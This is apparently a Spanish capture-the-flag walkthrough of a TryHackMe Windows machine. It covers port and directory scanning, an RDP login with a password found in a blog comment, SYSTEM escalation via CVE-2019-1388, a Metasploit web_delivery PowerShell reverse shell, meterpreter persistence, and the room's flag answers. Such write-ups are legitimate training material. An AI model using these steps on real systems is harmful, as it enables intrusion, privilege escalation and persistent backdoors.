
10.10.199.113

# 1) Activar escáneres avanzados y lanzar torpedos de protones (Reconocimiento)

## a) ¿Cuántos puertos están abiertos en nuestro sistema de destino?

Realizamos un escaneo de puertos basico, solo para mostrar servicios y poco mas con Nmap, usando:

```
nmap -sV 10.10.199.113
```

![](IMG/Pasted%20image%2020250228215356.png)

Nos dice que parece que no esta activo, y que si está activo, posiblemente esté bloqueando los ping, así que nos sugiere que probemos -Pn, probamos entonces con:

```
nmap -sV -Pn 10.10.199.113
```

Ahora si, nos muestra los puertos.

![](IMG/Pasted%20image%2020250228215626.png)

**Respuesta: 2**

## b) Parece que hay un servidor web ejecutándose, ¿cuál es el título de la página que descubrimos cuando navegamos hacia él?

Entramos con el navegador a la ip de la maquina y vemos:

![](IMG/Pasted%20image%2020250228215751.png)

**Respuesta: IIS Windows Server**

## c) Interesante. Veamos si hay algo más en este servidor web mediante fuzzing. ¿Qué directorio oculto descubrimos?

Podemos usar varias aplicaciones para esto, dirbuster, zap, etc... con interfaz gráfica o sin ella, nosotros usaremos gobuster por comandos, ejecutamos:

```
gobuster dir -u http://10.10.199.113/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 -x php,html 2>/dev/null
```

![](IMG/Pasted%20image%2020250228220416.png)

**Respuesta: /retro**

## d) Navega hasta nuestro directorio oculto descubierto, ¿qué nombre de usuario potencial descubrimos?

Accedemos al directorio oculto con el navegador y encontramos un posible nombre de usuario.

![](IMG/Pasted%20image%2020250228220602.png)

**Respuesta: Wade**

## e) Al revisar las publicaciones, parece que nuestro usuario ha tenido algunas dificultades para iniciar sesión recientemente. ¿Qué posible contraseña descubrimos?

Probamos a entrar a los posts, si accedemos al post de "Ready player one":

![](IMG/Pasted%20image%2020250228221156.png)

Vemos que el usuario se ha escrito un comentario, y en el se hace un recordatorio:

![](IMG/Pasted%20image%2020250228221255.png)

**Respuesta: parzival**

## f) Inicie sesión en la máquina a través de Microsoft Remote Desktop (MSRDP) y lea el archivo user.txt. ¿Cuál es su contenido?

Para conectarnos, usaremos "remmina", para lo que ejecutamos:

```
remmina
```

![](IMG/Pasted%20image%2020250228221526.png)

Y realizamos la conexión, con los datos que tenemos:

![](IMG/Pasted%20image%2020250228221650.png)
![](IMG/Pasted%20image%2020250228221732.png)
![](IMG/Pasted%20image%2020250228221800.png)

Abrimos el archivo user.txt

![](IMG/Pasted%20image%2020250228221919.png)

**Respuesta: THM{HACK_PLAYER_ONE}**

# 2) Violación de la sala de control (Obtener acceso)

## a) Al enumerar una máquina, suele ser útil observar qué estaba haciendo el usuario por última vez. Observe la máquina y vea si puede encontrar el CVE que se investigó en este servidor. ¿Qué CVE era?

Deberiamos de poder verlo en el historial del navegador, pero no se porque está eliminado.

![](IMG/Pasted%20image%2020250228222827.png)

Se supone que tenia que salir una busqueda sobre el CVE, en la pista nos dicen cual es.

**Respuesta: CVE-2019-1388**

## b) Parece que se necesita un archivo ejecutable para explotar esta vulnerabilidad y el usuario no lo ha limpiado muy bien después de probarlo. ¿Cómo se llama este ejecutable?

Lo encontramos en el escritorio:

![](IMG/Pasted%20image%2020250228223036.png)

**Respuesta: hhupd**

## c) Investiga la vulnerabilidad y cómo explotarla. ¡Explotala ahora para obtener una terminal privilegiada!

Ejecutamos el archivo ejecutable para investigar la vulnerabilidad.

![](IMG/Pasted%20image%2020250228223549.png)
![](IMG/Pasted%20image%2020250228223621.png)
![](IMG/Pasted%20image%2020250228223700.png)

Se abrirá el navegador, guardamos la pagina con Control + S.

```
Control + S
```

![](IMG/Pasted%20image%2020250228223838.png)
![](IMG/Pasted%20image%2020250228223943.png)

Cerramos la ventana emergente, y en ese mismo sitio, ejecutamos una consola de comandos.

```
cmd
```

![](IMG/Pasted%20image%2020250228224033.png)

## c) Ahora que hemos creado una terminal, ejecutemos el comando "whoami". ¿Cuál es el resultado de ejecutarlo?

Si hacemos un whoami, veremos que tenemos una consola con permisos elevados.

![](IMG/Pasted%20image%2020250228224123.png)

**Respuesta: nt authority\system**

## d) Ahora que hemos confirmado que tenemos un indicador elevado, lea el contenido de root.txt en el escritorio del administrador. ¿Cuál es el contenido? ¡Mantenga su terminal en funcionamiento después de la explotación para que podamos usarlo en la tarea cuatro!

Vamos a la ruta del escritorio

```
cd users
cd administrator
```

![](IMG/Pasted%20image%2020250228224738.png)

```
cd desktop
```

![](IMG/Pasted%20image%2020250228224848.png)

lo ejecutamos:

```
root.txt
```

![](IMG/Pasted%20image%2020250228225009.png)

![](IMG/Pasted%20image%2020250228224942.png)
![](IMG/Pasted%20image%2020250228225039.png)

**Respuesta: THM{COIN_OPERATED_EXPLOITATION}**

# 3) Adopción en el colectivo (Explotación)

## a) Regrese a la máquina del atacante para la siguiente parte. Como sabemos que la máquina de nuestra víctima está ejecutando Windows Defender, ¡sigamos adelante e intentemos un método diferente de entrega de carga útil! Para esto, usaremos el exploit de entrega web de script dentro de Metasploit. Inicie Metasploit ahora y seleccione 'exploit/multi/script/web_delivery' para su uso.

Ejecutamos metasploit:

```
msfconsole
```

![](IMG/Pasted%20image%2020250228225532.png)

Y ejecutamos:

```
use exploit/multi/script/web_delivery
```

![](IMG/Pasted%20image%2020250228225633.png)

## b) Primero, establezcamos el destino en PSH (PowerShell). ¿Qué número de destino es PSH?

Para ver los objetivos, ejecutamos:

```
show targets
```

y veremos los objetivos, donde PSH tiene el id 2.

![](IMG/Pasted%20image%2020250228225913.png)

**Respuesta: 2**

Ahora, lo seleccionamos, para lo que ejecutamos:

```
set target 2
```

![](IMG/Pasted%20image%2020250228230138.png)
## c) Después de configurar su carga útil, configure su lhost y lport según corresponda para que sepa en qué puerto se ejecutará el servidor web MSF y que se ejecutará en la red TryHackMe.

Ahora, configuramos LHOST:

```
set LHOST tun0
```

![](IMG/Pasted%20image%2020250228230415.png)

**Respuesta: No aplica.**


> [!NOTE] 
> Importante, hay que configurar tambien LPORT a un puerto distinto a 8080 o nos dará error, como veremos mas adelante, por no haberlo configurado aquí.


## d) Por último, configuremos nuestra carga útil. En este caso, utilizaremos una carga útil HTTP inversa simple. Haga esto ahora con el comando: 'set payload windows/meterpreter/reverse_http'. A continuación, ejecute el ataque como un trabajo con el comando 'run -j'.

Ejecutamos:

```
set payload windows/meterpreter/reverse_http
```

![](IMG/Pasted%20image%2020250228230613.png)

y ejecutamos:

```
run -j
```

Y nos da un error en el que nos dice que la dirección ya esta en uso.

![](IMG/Pasted%20image%2020250228230739.png)

El problema está en que tanto el servidor como el cliente tienen el mismo puerto configurado, el 8080, deberiamos hacerlo configurado antes, cuando hicimos la configuracion del LHOST, tambien debiamos hacer la del LPORT y ponerla en otro puerto distinto a 8080, por ejemplo, 1234, asi que lo configuramos:

```
set LPORT 1234
```

![](IMG/Pasted%20image%2020250228230948.png)

y volvemos a intentarlo, esta vez, si que debe funcionar

![](IMG/Pasted%20image%2020250228231014.png)

**Respuesta: No aplica.**

## e) Regresa a la terminal que creamos con nuestro exploit. En esta terminal, pega el comando generado por Metasploit después de que se lanzó el trabajo. En este caso, me resultó particularmente útil alojar un servidor web Python simple (python3 -m http.server) y alojar el comando en un archivo de texto, ya que copiar y pegar entre las máquinas no siempre funciona. Una vez que hayas ejecutado este comando, regresa a nuestra máquina atacante y observa que se generó nuestro shell inverso.

Pegamos el comando que nos aparece

![](IMG/Pasted%20image%2020250228233823.png)

Y se abrirá la sesión, lo vemos en la consola del atacante.

![](IMG/Pasted%20image%2020250228233852.png)

si comprobamos las sesiones, podremos verla

```
sessions
```

![](IMG/Pasted%20image%2020250228234110.png)

**Respuesta: No aplica.**

## f) Por último, pero no por ello menos importante, veamos los mecanismos de persistencia a través de Metasploit. ¿Qué comando podemos ejecutar en nuestra consola de meterpreter para configurar la persistencia que se inicia automáticamente cuando se inicia el sistema? No incluya nada más allá del comando base y la opción para el inicio del arranque.

En esta web: https://www.offsec.com/metasploit-unleashed/meterpreter-service/ podemos ver los comandos de meterpreter. El comando que nosotros buscamos es:

![](IMG/Pasted%20image%2020250228234855.png)

**Respuesta: run persistence -x**

## g) Ejecute este comando ahora con opciones que le permitan volver a conectarse a su máquina host si el sistema se reinicia. Tenga en cuenta que deberá crear un receptor a través del exploit del controlador para permitir esta conexión remota en la práctica. ¡Felicitaciones, ahora obtuvo control total sobre el host remoto y estableció persistencia para operaciones futuras!

**Respuesta: No aplica.**